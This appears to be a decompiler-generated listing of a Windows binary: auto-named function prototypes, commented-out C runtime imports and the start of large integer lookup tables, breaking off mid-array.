_BYTE *__cdecl sub_4B34D0(_BYTE *a1, _BYTE *a2, int a3, int a4, unsigned __int8 *a5, int *a6);
int __cdecl sub_4B36C0(char *a1, int a2, unsigned __int8 *a3);
int *__cdecl sub_4B3830(int *a1, int a2);
int __cdecl sub_4B3970(int *a1, int a2);
unsigned int __cdecl sub_4B3AD0(unsigned __int8 *a1, _BYTE *a2, unsigned int a3, int a4, unsigned __int16 *a5, int a6);
int *__cdecl sub_4B3FB0(char *a1, _BYTE *a2, int a3, int a4, unsigned __int16 *a5, int *a6, int a7);
_WORD *__cdecl sub_4B41A0(unsigned __int16 *a1, _WORD *a2, int a3, int a4);
int *__cdecl sub_4B4270(_BYTE *a1, _BYTE *a2, int a3, int a4, unsigned __int16 *a5, int *a6);
unsigned __int16 *__cdecl sub_4B4460(_BYTE *a1, int a2, int a3, int a4);
char __cdecl sub_4B4560(char *a1, char *a2, unsigned int a3, int a4, char *a5, int a6);
unsigned int *__cdecl sub_4B4590(_BYTE *a1, _BYTE *a2, unsigned int a3, int a4, int a5, unsigned int *a6, int a7);
_BYTE *__cdecl sub_4B45D0(unsigned __int8 *a1, _BYTE *a2, int a3, int a4);
unsigned int *__cdecl sub_4B4600(_BYTE *a1, _BYTE *a2, unsigned int a3, int a4, int a5, unsigned int *a6);
int *__cdecl sub_4B4630(unsigned __int8 *a1, int *a2);
_BYTE *__cdecl sub_4B5100(unsigned __int8 *a1, _BYTE *a2, int a3);
_BYTE *__cdecl sub_4B5EC0(unsigned __int8 *a1, _BYTE *a2, int a3);
_BYTE *__cdecl sub_4B6C80(int a1, _BYTE *a2, _DWORD *a3);
unsigned int *__cdecl sub_4B6D30(unsigned int *a1, _DWORD *a2);
unsigned int __cdecl sub_4B7590(unsigned __int8 *a1, _BYTE *a2, unsigned int a3, _DWORD *a4, int a5, int a6);
_BYTE *__cdecl sub_4B7A80(_BYTE *a1, _BYTE *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int *a6);
int *__cdecl sub_4B7C70(char *a1, _BYTE *a2, int a3, _DWORD *a4, int a5, int *a6, int a7);
_DWORD *__cdecl sub_4B7E70(unsigned __int8 *a1, _DWORD *a2);
int __fastcall sub_4B7FF0(int a1);
int __cdecl sub_4B8040(int a1, int *a2);
_WORD *__cdecl sub_4B80E0(unsigned __int16 *a1, _WORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int a6);
char __cdecl sub_4B81C0(_BYTE *a1, _BYTE *a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6, unsigned __int8 *a7, int *a8);
// int __usercall sub_4B8400@<eax>(_DWORD *a1@<ecx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>);
// int __usercall sub_4B8B20@<eax>(_DWORD *a1@<ecx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>);
int __cdecl sub_4B9240(_DWORD *a1, _DWORD *a2, int a3);
_DWORD *__cdecl sub_4B9340(_DWORD *a1, _DWORD *a2, int a3);
int __cdecl sub_4B93A0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int __cdecl sub_4B94D0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int __cdecl sub_4B9600(int *a1, int a2, int a3, _DWORD *a4, int *a5, int a6);
int __cdecl sub_4B9800(int *a1, int a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6, int *a7, int a8);
int *__cdecl sub_4BA200(char *a1, _BYTE *a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6, unsigned __int16 *a7, int *a8, int a9);
unsigned __int8 *__cdecl sub_4BA420(int a1, int a2, int a3, unsigned int a4, _DWORD *a5, _DWORD *a6, _DWORD *a7, unsigned __int8 *a8, int a9);
unsigned __int8 *__cdecl sub_4BAB40(unsigned __int8 *a1);
_DWORD *__cdecl sub_4BABD0(unsigned __int16 *a1, _DWORD *a2);
_BYTE *__cdecl sub_4BB1A0(const __m128i *Src, size_t Size, _BYTE *a3);
_WORD *__cdecl sub_4BB210(unsigned __int16 *a1, _WORD *a2, _DWORD *a3, int a4);
int *__cdecl sub_4BB2C0(_BYTE *a1, _BYTE *a2, int a3, _DWORD *a4, unsigned __int16 *a5, int *a6);
int *__cdecl sub_4BB4B0(char *a1, _BYTE *a2, int a3, _DWORD *a4, unsigned __int16 *a5, int *a6, int a7);
int __cdecl sub_4BB6A0(int a1, int a2, int a3, unsigned int a4, _DWORD *a5, unsigned __int8 *a6, int a7);
unsigned __int16 *__cdecl sub_4BBCE0(unsigned __int8 *a1, _BYTE *a2, unsigned int a3, _DWORD *a4, unsigned __int16 *a5, unsigned __int16 *a6, unsigned __int8 *a7, int a8);
// int __usercall sub_4BC2A0@<eax>(_DWORD *a1@<ecx>, _DWORD *a2@<esi>);
int __cdecl sub_4BC3B0(int *a1, int a2, unsigned int a3);
int __cdecl sub_4BE0B0(int *a1, char *Src, size_t Size);
int __cdecl sub_4BE140(_DWORD *a1, int *a2);
// void *__usercall sub_4BE1B0@<eax>(_DWORD *a1@<esi>);
int __fastcall sub_4BE230(_DWORD *a1, _DWORD *a2);
unsigned int *__cdecl sub_4BE330(unsigned int *a1, int a2, unsigned int a3);
int __cdecl sub_4C6880(unsigned int *a1, char *Src, size_t Size);
int __cdecl sub_4C6920(_DWORD *a1, unsigned int *a2);
__m64 *__cdecl sub_4C69C0(__m64 *a1, __m64 *Src, unsigned int a3);
int __cdecl sub_4C6C80(__m64 *a1, __m64 *a2);
int __cdecl sub_4C6D70(__m64 *a1, __m64 *Src, unsigned int a3);
int __cdecl sub_4C6DD0(_DWORD *a1, int *Src, size_t Size);
int __cdecl sub_4C6EB0(int a1, int *a2);
int __cdecl sub_4C7000(_DWORD *a1);
int __cdecl sub_4C7070(int a1, int a2);
int __cdecl sub_4C7220(_DWORD *a1, _DWORD *a2);
int __cdecl sub_4C7290(size_t *a1, char *Src, size_t Size);
unsigned __int8 *__cdecl sub_4C7330(int *a1, unsigned __int8 *a2, int a3);
int __cdecl sub_4C7A00(int a1, unsigned __int8 *Src, size_t Size);
int __cdecl sub_4C7AE0(int a1, int a2);
int __cdecl sub_4C7C10(int a1, int a2);
// int __usercall sub_4C7D70@<eax>(volatile LONG *a1@<esi>);
int __cdecl sub_4C7DC0(char *Str, const char *a2, int a3);
int sub_4C81B0(); // weak
int sub_4C8240(); // weak
BOOL sub_4C8290();
int sub_4C82B0(); // weak
int __cdecl sub_4C82C0(const char *Src, const char *a2);
int __cdecl sub_4C85E0(int a1, int a2);
BOOL sub_4C8690();
int __cdecl sub_4C86B0(const char *a1);
int sub_4C87D0(); // weak
BOOL sub_4C8870();
char **sub_4C8890();
int __cdecl sub_4C88A0(int a1);
int __cdecl sub_4C8990(int a1);
FARPROC __cdecl sub_4C8A50(int a1, LPCSTR lpProcName);
// _DWORD *__usercall sub_4C8B30@<eax>(_BYTE *a1@<ecx>, int a2@<ebx>);
char *__cdecl sub_4C8D40(int a1, char *Str);
FARPROC __cdecl sub_4C8E10(const CHAR *a1);
// char *__usercall sub_4C8F90@<eax>(int a1@<esi>);
char *__cdecl sub_4C91F0(int a1, char *a2, char *a3);
void __cdecl sub_4C93E0(int a1, int *a2, int a3, int a4);
// int __usercall sub_4C94F0@<eax>(signed int Size@<ecx>, int a2@<edx>, int a3@<edi>, int a4@<esi>, int a5, int a6);
int __cdecl sub_4C9570(int a1, int a2, int a3, signed int Size);
int __cdecl sub_4C97A0(int a1, const char *a2, int a3, int a4, int a5);
char **sub_4C9900();
void *__cdecl sub_4C9910(int a1);
int __cdecl sub_4C9960(_DWORD *a1);
int __cdecl sub_4C9990(_DWORD *a1);
int __cdecl sub_4C99C0(_DWORD *Block);
int __cdecl sub_4C99E0(int a1, const char *a2, void **a3);
unsigned __int8 *__cdecl sub_4C9D90(unsigned __int8 *a1);
unsigned __int8 *__cdecl sub_4C9DC0(unsigned __int8 *a1);
// char *__usercall sub_4C9E00@<eax>(int a1@<edx>, char *a2);
// char *__usercall sub_4C9E60@<eax>(int a1@<edx>, char *a2);
int __cdecl sub_4C9EB0(const char **a1, int a2);
int __cdecl sub_4C9EF0(int a1, int a2);
int __cdecl sub_4C9F10(int a1, unsigned __int8 a2);
int __cdecl sub_4C9F30(int a1, char a2);
int __cdecl sub_4C9F40(_DWORD *Block);
// char *__usercall sub_4C9F70@<eax>(int a1@<edi>, char *a2);
int __cdecl sub_4CA010(int a1, int a2, _DWORD *a3);
int __cdecl sub_4CA5F0(int a1, LPCCH lpMultiByteStr, _DWORD *a3);
_DWORD *__cdecl sub_4CA680(int a1, int a2);
int __cdecl sub_4CA710(int a1, _DWORD *a2, _DWORD *a3);
char *__cdecl sub_4CA790(int a1, const char *a2, char *VarName);
int __cdecl sub_4CA860(_BYTE **a1);
int __cdecl sub_4CA890(int a1, int a2);
BOOL __cdecl sub_4CA920(int a1);
int __cdecl sub_4CA960(int a1, _DWORD *a2);
void __cdecl sub_4CA980(void **Block);
_DWORD *__cdecl sub_4CAA20(int a1, void *Src);
void __cdecl sub_4CAAE0(_DWORD *Block);
BOOL __cdecl sub_4CAB30(int **a1, void *Src, int Size, int *a4, volatile LONG *a5);
int __cdecl sub_4CAD60(_DWORD *a1);
BOOL __cdecl sub_4CAD80(_DWORD *a1, int a2, _DWORD *a3);
void __cdecl sub_4CAE30(_BYTE **Block);
int __cdecl sub_4CAEA0(int a1);
int __cdecl sub_4CAF60(_DWORD *a1, _DWORD *a2);
int __cdecl sub_4CB020(int *a1, int a2);
_BYTE **sub_4CB050();
void *__cdecl sub_4CB090(int *a1, void *Src, int Size, int a4, int a5, void *a6, _DWORD *a7);
int __cdecl sub_4CB160(int *a1);
int __cdecl sub_4CB1C0(_DWORD *a1, volatile LONG **a2);
int __cdecl sub_4CB270(int a1, int a2, int a3);
_DWORD *__cdecl sub_4CB2A0(_DWORD *a1, int a2);
int *__cdecl sub_4CB2C0(int a1, volatile LONG *a2, int a3, int a4);
// int __usercall sub_4CB340@<eax>(__m64 a1@<mm0>, int a2, unsigned int a3, unsigned int a4, int *a5, void *Src, size_t Size, void *a8, int *a9, int *a10, _DWORD *a11);
// int __usercall sub_4CBA40@<eax>(__m64 a1@<mm0>, int a2, int a3, unsigned int a4, int *a5, const void *a6, int Size, int a8, void *a9, int *a10, unsigned int *a11, _DWORD *a12);
// int __usercall sub_4CC360@<eax>(__m64 a1@<mm0>, int a2, int a3, int a4, _DWORD *a5);
// int __usercall sub_4CC4E0@<eax>(__m64 a1@<mm0>, int a2, int a3, int a4, _DWORD *a5);
int sub_4CC500();
int sub_4CC560();
int sub_4CC5C0();
// int __usercall sub_4CC620@<eax>(_BYTE **a1@<edi>, int *a2@<esi>, int a3);
signed int __fastcall sub_4CC690(unsigned int a1, unsigned int a2, void **a3, char **a4, int a5, int a6);
int __cdecl sub_4CC7B0(char *a1, size_t Size, int a3, unsigned int a4, int a5, char *a6, int a7, int *a8);
_BYTE **__cdecl sub_4CC990(char *a1, size_t Size, int a3, unsigned int a4, int a5, unsigned int a6, int *a7);
// int __usercall sub_4CCB70@<eax>(int a1@<esi>, __m64 a2@<mm0>);
// int __usercall sub_4CCC70@<eax>(__m64 a1@<mm0>, int a2);
int __cdecl sub_4CCC90(int a1, int a2, int *a3, int a4, _BYTE *a5, int a6);
int __cdecl sub_4CCFF0(int a1, _BYTE *a2, int a3, int *a4, int a5, int a6);
int __cdecl sub_4CD280(unsigned int a1, int a2, int a3, int a4, int *a5, _BYTE *a6);
int __cdecl sub_4CD490(_BYTE *a1, int a2);
int __cdecl sub_4CD530(int a1, char *a2, unsigned int a3, _DWORD *a4, int *a5, int a6, size_t Size, int a8);
int __cdecl sub_4CD890(int a1, char *a2, int a3, int a4, size_t Size, int a6);
int __cdecl sub_4CD8D0(int a1, int a2, int a3, int a4, int *a5, int a6);
// int __usercall sub_4CD9D0@<eax>(int a1@<edx>, int a2@<ecx>, __m64 a3@<mm0>, _DWORD *a4, _DWORD *a5);
// int __usercall sub_4CDE50@<eax>(__m64 a1@<mm0>, int a2, int a3, _DWORD *a4, _DWORD *a5);
int __cdecl sub_4CDE80(int *a1);
volatile LONG *__cdecl sub_4CDF40(_DWORD *a1);
int __cdecl sub_4CDFF0(int a1, int **a2, _DWORD *a3);
int *__cdecl sub_4CE0D0(int *a1);
int *__cdecl sub_4CE120(int *a1, int *Block);
int __cdecl sub_4CE200(int *a1, int **a2);
void *__cdecl sub_4CE340(_DWORD *a1);
void *__cdecl sub_4CE6F0(int a1);
size_t __cdecl sub_4CE720(int a1, int *a2, _DWORD *a3, void *Src, size_t Size);
// char *__usercall sub_4CE750@<eax>(unsigned int a1@<edi>, void *a2, _DWORD *a3, char *Src, int **a5);
// int __usercall sub_4CE8B0@<eax>(size_t a1@<ecx>, char *a2@<edi>, unsigned int *a3, _BYTE *Src, _DWORD *a5);
int __cdecl sub_4CE990(unsigned int a1, int a2, int a3);
int __cdecl sub_4CECC0(int a1, _DWORD *a2, int a3, int a4, int *a5);
int __cdecl sub_4CED20(_DWORD *a1, int *a2);
int __cdecl sub_4CED80(int a1);
int __cdecl sub_4CED90(int a1, unsigned int a2, int a3);
BOOL __cdecl sub_4CEDA0(int a1, int a2, int a3, char *Src, signed int Size);
int __cdecl sub_4CEDD0(_DWORD *a1);
int __cdecl sub_4CF070(int a1, __int64 a2);
unsigned __int8 *__cdecl sub_4CF150(unsigned __int8 *a1, __int64 a2, unsigned __int64 a3, int a4, int a5, _DWORD *a6);
int __cdecl sub_4CF370(char *a1, int a2, int a3, int a4, unsigned __int64 a5, unsigned __int64 a6, unsigned __int64 a7, __int64 a8, char *a9, int a10);
int __cdecl sub_4CF650(int a1, int a2, int a3, int a4, int Val, int a6, signed int Size, char *a8, int *a9);
int __cdecl sub_4CFAF0(const char *a1, int a2, int a3, int a4, int Val, int a6, signed int Size, char *a8, int *a9);
int __cdecl sub_4CFBA0(int a1, _BYTE **a2, unsigned int a3);
void **__cdecl sub_4CFC90(void ***a1, void **a2, size_t Size);
int __cdecl sub_4CFE60(int a1, _BYTE **a2);
int __cdecl sub_4CFF40(int a1, _BYTE **a2);
void __cdecl sub_4D00E0(void *Block);
int *__cdecl sub_4D0100(int **a1, void **a2, int a3);
int __cdecl sub_4D0270(int *a1, void **a2);
int __cdecl sub_4D0460(int **a1, _DWORD *a2, int a3);
int __cdecl sub_4D04E0(int *a1, void **a2);
int *__cdecl sub_4D0550(unsigned __int64 a1, int a2);
int __cdecl sub_4D0630(int a1, int a2, int a3, int **a4);
int __cdecl sub_4D07F0(int *a1, int a2, int a3, const char *a4, int **a5);
int __cdecl sub_4D0870(int a1, int *a2);
int __cdecl sub_4D0950(_DWORD *a1, int a2, int a3);
// int __usercall sub_4D09A0@<eax>(_DWORD *a1@<ecx>, int *a2@<ebx>, int *a3@<edi>, unsigned int *a4@<esi>, __m64 a5@<mm0>, _DWORD *a6, int a7, void *a8);
int __cdecl sub_4D0A30(int *a1, int a2, int a3);
int __cdecl sub_4D0BC0(int *a1, int a2, int *a3, int a4, int *a5);
int __cdecl sub_4D0CD0(int **a1, int a2, int *a3, int *a4, int *a5);
// int __usercall sub_4D0E70@<eax>(__m64 a1@<mm0>, int *a2, int a3, int *Block, int a5, _DWORD *a6);
// int __usercall sub_4D1260@<eax>(__m64 a1@<mm0>, int **a2, int a3, int a4, int *a5, int *a6, _DWORD *a7);
void sub_4D1540();
// int __usercall sub_4D1680@<eax>(int a1@<eax>, unsigned int a2@<ebx>);
// int __usercall sub_4D1800@<eax>(__m64 a1@<mm0>, int a2, __m128 a3);
int __cdecl sub_4D1980(_DWORD *a1, _DWORD *a2, _DWORD *a3);
void __cdecl sub_4D1A40(unsigned int *a1, int a2, int a3, int a4);
int __cdecl sub_4D1C20(int a1, _DWORD *a2, int a3);
// void __usercall sub_4D1CC0(const __m128i *a1@<ebx>, int a2@<edi>);
// __m128i *__usercall sub_4D2060@<eax>(__m128i si128@<xmm7>, int a2, const __m128i *a3, unsigned int a4, int a5);
int __cdecl sub_4D2DE0(unsigned int *a1, _DWORD *a2, int a3);
// void __usercall sub_4D2EE0(int _EBX@<ebx>, int _EDI@<edi>);
int __cdecl sub_4D3200(_DWORD *a1, int a2, unsigned int a3, int a4);
__m64 *__cdecl sub_4D3980(__m64 *a1, __m64 *a2, int a3);
int __cdecl sub_4D4D00(_DWORD *a1, int *a2, int a3);
volatile LONG *__cdecl sub_4D61F0(int a1);
int __cdecl sub_4D6210(int a1, int **a2, int a3);
_BYTE *__cdecl sub_4D6360(const char *a1, unsigned int a2, _DWORD *a3, size_t *a4);
_BYTE *__cdecl sub_4D63E0(const char *a1, signed int a2, _DWORD *a3, size_t *a4);
_DWORD *sub_4D6560();
void __cdecl sub_4D65A0(void **Block);
int __cdecl sub_4D6600(int a1, void *Src, size_t Size); // idb
int __cdecl sub_4D6690(int a1);
BOOL __cdecl sub_4D66C0(int a1);
BOOL __cdecl sub_4D6700(_DWORD *a1);
int __cdecl sub_4D6740(int **a1, _BYTE *a2, unsigned int a3);
int __cdecl sub_4D6800(__m64 *a1, __m64 *a2, int a3);
// int __usercall sub_4D80F0@<eax>(_DWORD *a1@<esi>, int a2, void (__cdecl *a3)(int, _DWORD *, _DWORD *, _DWORD *), int a4);
// int __usercall sub_4D8190@<eax>(int a1@<edi>, _DWORD *a2@<esi>, int (__cdecl *a3)(int, _DWORD *, _DWORD *, _DWORD *), int a4, int a5);
int __cdecl sub_4D81E0(int a1, int a2, int a3);
_DWORD *__cdecl sub_4D8200(int a1, int a2, int a3);
int __cdecl sub_4D8220(int a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_4D8420(int a1);
int __cdecl sub_4D84A0(_DWORD *a1, int a2, int a3);
int __cdecl sub_4D8680(_DWORD *a1, const char *a2);
int __cdecl sub_4D86B0(int a1);
int __cdecl sub_4D8720(int a1);
int __cdecl sub_4D8780(_DWORD *a1, char *a2, int a3);
int __cdecl sub_4D8B70(_DWORD *a1, char *Src, signed int Size);
int __cdecl sub_4D8FD0(_DWORD *a1, int a2, int a3, int a4);
int __cdecl sub_4D9260(_DWORD *a1, char *Src);
int __cdecl sub_4D9290(_DWORD *a1);
int __cdecl sub_4D9340(int a1);
int __cdecl sub_4D93B0(_DWORD *a1, char *a2, int a3);
int __cdecl sub_4D94E0(_DWORD *a1, char *Src, signed int Size);
int __cdecl sub_4D9660(_DWORD *a1, int a2, signed int Size, _DWORD *Src);
int __cdecl sub_4D9AB0(int a1, int a2, int a3);
int __cdecl sub_4D9AD0(_DWORD *a1, _BYTE *a2, int a3);
int __cdecl sub_4D9BB0(_DWORD *a1, char *Src);
void *sub_4D9BE0();
void *sub_4D9BF0();
void *sub_4D9C00();
void *sub_4D9C10();
void *sub_4D9C20();
// void __fastcall __security_check_cookie(uintptr_t StackCookie);
// int sprintf(char *const Buffer, const char *const Format, ...);
// void __cdecl free(void *Block);
// void *__cdecl calloc(size_t Count, size_t Size);
// int __cdecl _stat64(const char *FileName, struct _stat64 *Stat);
// void *__cdecl malloc(size_t Size);
// char *__cdecl strstr(const char *Str, const char *SubStr);
void **sub_4DA3E6();
// int __cdecl _fseeki64(FILE *Stream, __int64 Offset, int Origin);
// int __cdecl remove(const char *FileName);
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// int printf(const char *const Format, ...);
// FILE *__cdecl fopen(const char *FileName, const char *Mode);
// size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// char *__cdecl strrchr(const char *Str, int Ch);
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct localeinfo_struct *); idb
// int __cdecl toupper(int C);
// char *__cdecl getenv(const char *VarName);
// int __cdecl fclose(FILE *Stream);
// void __cdecl __noreturn _exit(int Code);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
// char *__cdecl strchr(const char *Str, int Val);
// void *__cdecl realloc(void *Block, size_t Size);
// int __cdecl strtol(const char *String, char **EndPtr, int Radix);
// unsigned int __cdecl strtoul(const char *String, char **EndPtr, int Radix);
// int sscanf(const char *const Buffer, const char *const Format, ...);
// wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);
// int __cdecl _vsnwprintf(wchar_t *Buffer, size_t BufferCount, const wchar_t *Format, va_list Args);
// int __cdecl _vsnprintf(char *const Buffer, const size_t BufferCount, const char *const Format, va_list ArgList);
int sub_4DC8ED();
// _crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function);
// int __cdecl raise(int Signal);
// int __cdecl isdigit(int C);
// int __cdecl isxdigit(int C);
// int __cdecl isspace(int C);
// int __cdecl feof(FILE *Stream);
// int __cdecl ferror(FILE *Stream);
// _DWORD __cdecl flsall(_DWORD); weak
// int __cdecl fflush(FILE *Stream);
int sub_4DD1FE();
int __cdecl sub_4DD2C3(_DWORD *a1);
// int __cdecl _setmode(int FileHandle, int Mode);
// int __cdecl _fileno_0(FILE *Stream);
// int __cdecl ftell(FILE *Stream);
// int __cdecl fseek(FILE *Stream, int Offset, int Origin);
// char *__cdecl fgets(char *Buffer, int MaxCount, FILE *Stream);
// int *__cdecl _errno();
// __time64_t __cdecl _time64(__time64_t *Time);
// int fprintf(FILE *const Stream, const char *const Format, ...);
// size_t __cdecl strcspn(const char *Str, const char *Control);
// size_t __cdecl strspn(const char *Str, const char *Control);
// int __cdecl strcmp(const char *Str1, const char *Str2);
// errno_t __cdecl strerror_s(char *Buffer, size_t SizeInBytes, int ErrorNumber);
// void __cdecl qsort(void *Base, size_t NumOfElements, size_t SizeOfElements, _CoreCrtNonSecureSearchSortCompareFunction CompareFunction);
// FILE *__cdecl _wfopen(const wchar_t *FileName, const wchar_t *Mode);
// int __cdecl tolower(int C);
// int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount);
// struct tm *__cdecl _gmtime64(const __time64_t *Time);
// int __cdecl _stricmp(const char *String1, const char *String2);
// int __cdecl atoi(const char *String);
// int __cdecl fputs(const char *Buffer, FILE *Stream);
int __cdecl sub_4DFA37(int a1);
// int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4E1457(int a1);
// _DWORD __cdecl _encode_pointer(_DWORD); weak
// int _encoded_null(void); weak
// _DWORD __cdecl _decode_pointer(_DWORD); weak
void *sub_4E4CA9();
void __cdecl sub_4E4CCF(); // idb
int __cdecl sub_4E5018(int a1);
int __cdecl sub_4E5027(int a1);
int __cdecl sub_4E5036(int a1);
// LONG __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
int sub_4E50E7();
// int _get_sse2_info(void); weak
int sub_4E5811();
void *sub_4E8749();
char **sub_4E874F();
void sub_4E8CC1();
int __cdecl sub_4E9BA0(_DWORD *a1);
int __cdecl sub_4E9BD9(_DWORD *a1);
int __cdecl sub_4E9C12(_DWORD *a1);
int *sub_4E9C4B();
int *sub_4E9C51();
int *sub_4E9C57();
void ***sub_4E9C5D();
int __cdecl sub_4E9CB0(int a1, int a2, int a3);
int __cdecl sub_4EBEB2(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_4EBF5A(_DWORD *a1, int a2, struct localeinfo_struct *a3);
// int __cdecl _sopen_helper_0(LPCWSTR lpFileName, int, int, int, int, int); idb
int __cdecl sub_4ECDBF(int a1, LPCWSTR lpFileName, int a3, int a4, int a5); // idb
int __cdecl sub_4ED2B9(unsigned __int16 *a1, _DWORD *a2);
int __cdecl sub_4ED7FD(unsigned __int16 *a1, _DWORD *a2);
// _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401005; // weak
_UNKNOWN loc_408C4E; // weak
int dword_40B8C0[16] =
{
  202313229,
  202313229,
  202313229,
  202313229,
  67569157,
  67569157,
  67569157,
  67569157,
  1,
  1,
  1,
  1,
  27,
  27,
  27,
  27
}; // weak
int dword_40EDD8[618] =
{
  753790401,
  753790401,
  1612718144,
  1612718144,
  536673507,
  536673507,
  -927878791,
  -927878791,
  -312779850,
  -312779850,
  -1100322092,
  -1100322092,
  1187761037,
  1187761037,
  -641810841,
  -641810841,
  1262041458,
  1262041458,
  -565556588,
  -565556588,
  -733197160,
  -733197160,
  -396863312,
  -396863312,
  1255133061,
  1255133061,
  1808847035,
  1808847035,
  720367557,
  720367557,
  -441800113,
  -441800113,
  385612781,
  385612781,
  -985447546,
  -985447546,
  -682799718,
  -682799718,
  1429418854,
  1429418854,
  -1803188975,
  -1803188975,
  -817543798,
  -817543798,
  284817897,
  284817897,
  100794884,
  100794884,
  -2122350594,
  -2122350594,
  -263171936,
  -263171936,
  1144798328,
  1144798328,
  -1163944155,
  -1163944155,
  -475486133,
  -475486133,
  -212774494,
  -212774494,
  -22830243,
  -22830243,
  -1069531008,
  -1069531008,
  -1970303227,
  -1970303227,
  -1382903233,
  -1382903233,
  -1130521311,
  -1130521311,
  1211644016,
  1211644016,
  83228145,
  83228145,
  -541279133,
  -541279133,
  -1044990345,
  -1044990345,
  1977277103,
  1977277103,
  1663115586,
  1663115586,
  806359072,
  806359072,
  452984805,
  452984805,
  250868733,
  250868733,
  1842533055,
  1842533055,
  1288555905,
  1288555905,
  336333848,
  336333848,
  890442534,
  890442534,
  804056259,
  804056259,
  -513843266,
  -513843266,
  -1567123659,
  -1567123659,
  -867941240,
  -867941240,
  957814574,
  957814574,
  1472513171,
  1472513171,
  -223893675,
  -223893675,
  -2105639172,
  -2105639172,
  1195195770,
  1195195770,
  -1402706744,
  -1402706744,
  -413311558,
  -413311558,
  723065138,
  723065138,
  -1787595802,
  -1787595802,
  -1604296512,
  -1604296512,
  -1736343271,
  -1736343271,
  -783331426,
  -783331426,
  2145180835,
  2145180835,
  1713513028,
  1713513028,
  2116692564,
  2116692564,
  -1416589253,
  -1416589253,
  -2088204277,
  -2088204277,
  -901364084,
  -901364084,
  703524551,
  703524551,
  -742868885,
  -742868885,
  1007948840,
  1007948840,
  2044649127,
  2044649127,
  -497131844,
  -497131844,
  487262998,
  487262998,
  1994120109,
  1994120109,
  1004593371,
  1004593371,
  1446130276,
  1446130276,
  1312438900,
  1312438900,
  503974420,
  503974420,
  -615954030,
  -615954030,
  168166924,
  168166924,
  1814307912,
  1814307912,
  -463709000,
  -463709000,
  1573044895,
  1573044895,
  1859376061,
  1859376061,
  -273896381,
  -273896381,
  -1503501628,
  -1503501628,
  -1466855111,
  -1466855111,
  -1533700815,
  -1533700815,
  937747667,
  937747667,
  -1954973198,
  -1954973198,
  854058965,
  854058965,
  1137232011,
  1137232011,
  1496790894,
  1496790894,
  -1217565222,
  -1217565222,
  -1936880383,
  -1936880383,
  1691735473,
  1691735473,
  -766620004,
  -766620004,
  -525751991,
  -525751991,
  -1267962664,
  -1267962664,
  -95005012,
  -95005012,
  133494003,
  133494003,
  636152527,
  636152527,
  -1352309302,
  -1352309302,
  -1904575756,
  -1904575756,
  -374428089,
  -374428089,
  403179536,
  403179536,
  -709182865,
  -709182865,
  -2005370640,
  -2005370640,
  1864705354,
  1864705354,
  1915629148,
  1915629148,
  605822008,
  605822008,
  -240736681,
  -240736681,
  -944458637,
  -944458637,
  1371981463,
  1371981463,
  602466507,
  602466507,
  2094914977,
  2094914977,
  -1670089496,
  -1670089496,
  555687742,
  555687742,
  -582268010,
  -582268010,
  -591544991,
  -591544991,
  -2037675251,
  -2037675251,
  -2054518257,
  -2054518257,
  -1871679264,
  -1871679264,
  1111375484,
  1111375484,
  -994724495,
  -994724495,
  -1436129588,
  -1436129588,
  -666351472,
  -666351472,
  84083462,
  84083462,
  32962295,
  32962295,
  302911004,
  302911004,
  -1553899070,
  -1553899070,
  1597322602,
  1597322602,
  -111716434,
  -111716434,
  -793134743,
  -793134743,
  -1853454825,
  -1853454825,
  1489093017,
  1489093017,
  656219450,
  656219450,
  -1180787161,
  -1180787161,
  954327513,
  954327513,
  335083755,
  335083755,
  -1281845205,
  -1281845205,
  856756514,
  856756514,
  -1150719534,
  -1150719534,
  1893325225,
  1893325225,
  -1987146233,
  -1987146233,
  -1483434957,
  -1483434957,
  -1231316179,
  -1231316179,
  572399164,
  572399164,
  -1836611819,
  -1836611819,
  552200649,
  552200649,
  1238290055,
  1238290055,
  -11184726,
  -11184726,
  2015897680,
  2015897680,
  2061492133,
  2061492133,
  -1886614525,
  -1886614525,
  -123625127,
  -123625127,
  -2138470135,
  -2138470135,
  386731290,
  386731290,
  -624967835,
  -624967835,
  837215959,
  837215959,
  -968736124,
  -968736124,
  -1201116976,
  -1201116976,
  -1019133566,
  -1019133566,
  -1332111063,
  -1332111063,
  1999449434,
  1999449434,
  286199582,
  286199582,
  -877612933,
  -877612933,
  -61582168,
  -61582168,
  -692339859,
  -692339859,
  974525996,
  974525996,
  2071428195,
  -982553614,
  728170800,
  1990973438,
  2110358218,
  -263759366,
  -1348283219,
  -1066228580,
  647232951,
  -856211658,
  -236608204,
  355588209,
  -1021065468,
  -1710909928,
  -494923257,
  1974609899,
  439124745,
  -1604686309,
  -1277805742,
  -2077236439,
  -318713517,
  1538391072,
  968805226,
  -816296886,
  -72683568,
  -2060235453,
  2130901317,
  -1465959344,
  -1891589295,
  -180839022,
  567981756,
  -755761392,
  -334295859,
  390371167,
  1031710660,
  1931042148,
  -598769312,
  -2003817950,
  347663942,
  -620011810,
  171586272,
